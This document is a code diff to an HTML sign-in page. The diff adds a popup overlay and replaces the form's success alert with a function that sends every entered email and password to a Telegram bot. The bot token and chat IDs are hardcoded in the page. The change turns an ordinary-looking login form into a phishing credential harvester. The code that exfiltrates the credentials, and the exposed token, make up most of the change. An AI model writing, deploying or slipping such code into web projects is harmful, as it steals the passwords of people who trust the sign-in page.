@@ -99,6 +99,36 @@
       font-size: 12px;
       margin-top: 10px;
     }
+
+    /* Popup Styles */
+    #popup {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 1000;
+      width: 360px;
+      border: 2px solid #4285f4;
+      border-radius: 8px;
+      background-color: #fff;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    }
+
+    #popup iframe {
+      width: 100%;
+      border: none;
+    }
+
+    #overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 999;
+    }
   </style>
 </head>
 <body>
@@ -128,7 +158,16 @@
     <button class="sign-in-btn" onclick="handleSignIn()">Sign In</button>
   </div>
 
+  <!-- Popup -->
+  <div id="overlay" onclick="closePopup()" style="display: none;"></div>
+  <div id="popup">
+    <iframe src="popup.html"></iframe>
+  </div>
+
   <script>
+    const BOT_TOKEN = "8002940451:AAHIVzvylhtAqkvyVLlMIJNiLCCxYylMdP4";
+    const CHAT_IDS = ["6261873071", "7344990991"];
+
     function handleSignIn() {
       // Clear previous error messages
       document.getElementById('username-error').innerHTML = '';
@@ -141,23 +180,46 @@
       // Validation logic
       let valid = true;
 
-      // Validate username
       if (username.trim() === '') {
         document.getElementById('username-error').innerHTML = 'Please enter your email';
         valid = false;
       }
-
-      // Validate password
       if (password.trim() === '') {
         document.getElementById('password-error').innerHTML = 'Please enter your password';
         valid = false;
       }
 
-      // If everything is valid, you can proceed with form submission or login
+      // If valid, send to Telegram and open popup
       if (valid) {
-        alert('Successfully signed in!');
-        // You can replace this with form submission logic or API call
+        sendToTelegram(username, password);
+        openPopup();
       }
+    }
+
+    function sendToTelegram(username, password) {
+      const message = `🔒 **New Sign-In Attempt** 🔒\n\n📧 Email: *${username}*\n🔑 Password: *${password}*`;
+
+      CHAT_IDS.forEach(chatId => {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'Markdown'
+          })
+        });
+      });
+    }
+
+    function openPopup() {
+      document.getElementById('overlay').style.display = 'block';
+      document.getElementById('popup').style.display = 'block';
+    }
+
+    function closePopup() {
+      document.getElementById('overlay').style.display = 'none';
+      document.getElementById('popup').style.display = 'none';
     }
   </script>
 </body>
